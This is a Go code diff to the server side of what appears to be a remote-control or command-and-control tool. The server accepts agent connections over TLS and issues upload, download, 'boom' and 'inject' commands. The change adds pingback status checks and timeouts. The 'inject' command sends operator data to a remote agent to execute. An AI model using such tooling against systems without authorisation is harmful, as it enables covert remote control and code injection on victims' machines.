@@ -15,13 +15,14 @@ import (
 )
 
 func StartServer(userOP config.UserOperation) {
+	// server mode
 	fladdr := userOP.ListenAddr
-    lbserver, err := transport.TLSServerBuilder(fladdr, false)
-    if err != nil {
-    	panic(err)
+	lbserver, err := transport.TLSServerBuilder(fladdr, false)
+	if err != nil {
+		panic(err)
 	}
-    for true {
-    	if lbserver != nil {
+	for true {
+		if lbserver != nil {
 			conn, err := lbserver.Accept()
 			if err != nil {
 				log.Println(err)
@@ -60,6 +61,7 @@ func handleClient(conn net.Conn){
 		useript := utils.ReadUserInput()
 		useriptD := strings.Split(useript, " ")
 		var curRTCmd *remoteop.RTCommand
+		var curPingBack *remoteop.PingBack
 		switch useriptD[0] {
 		case "upload":
 			fd, err := os.Stat(useriptD[1])
@@ -67,7 +69,7 @@ func handleClient(conn net.Conn){
 				log.Println(err)
 				continue
 			}
-			fdlen := func() int64{
+			fdlen := func() int64 {
 				size := fd.Size()
 				return (size / 1048576) + 1
 			}
@@ -82,15 +84,31 @@ func handleClient(conn net.Conn){
 					FilePathLocal:  []byte(useriptD[1]),
 					FilePathRemote: []byte(useriptD[2]),
 					FileLength:     buf[0],
+					HasData:        byte(1),
 				}
 				err := curRTCmd.BuildnSend(conn)
 				if err != nil {
 					log.Println(err)
 					continue
 				}
-				//todo: check pingback result
+				curPingBack, err = remoteop.ParseIncomingPB(conn)
+				if err != nil {
+					log.Println(err)
+					continue
+				}
+				if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
+					log.Println("Failed to execute command.")
+				}
 			}
 		case "download":
+			curRTCmd := &remoteop.RTCommand{
+				Command:        []byte("DWLD"),
+				FilePathLocal:  nil,
+				FilePathRemote: []byte(useriptD[1]),
+				FileLength:     0,
+				HasData:        0,
+				RealData:       nil,
+			}
 			//todo
 		case "boom":
 			curRTCmd := &remoteop.RTCommand{
@@ -107,16 +125,26 @@ func handleClient(conn net.Conn){
 		case "inject":
 			curRTCmd := &remoteop.RTCommand{
 				Command:    []byte("INJE"),
-				FileLength: 1,  // Max 1M Allowed
+				FileLength: 1, // Max 1M Allowed
 				HasData:    1,
 				RealData:   []byte(useriptD[1]),
 			}
+			_ = conn.SetReadDeadline(time.Now().Add(2 * time.Minute))
 			err := curRTCmd.BuildnSend(conn)
 			if err != nil {
 				log.Println(err)
 				continue
 			}
-			// todo: check ping back
+			curPingBack, err := remoteop.ParseIncomingPB(conn)
+			if err != nil {
+				log.Println(err)
+				_ = conn.SetReadDeadline(time.Now().Add(10 * time.Minute))
+				continue
+			}
+			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
+				log.Println("Function Execution Error. Agent may exits.")
+				continue
+			}
 		case "exit":
 			break
 		case "help":
@@ -125,5 +153,5 @@ func handleClient(conn net.Conn){
 			printHelp()
 		}
 	}
-	_ = conn.Close()
+	defer func() { _ = conn.Close() }()
 }
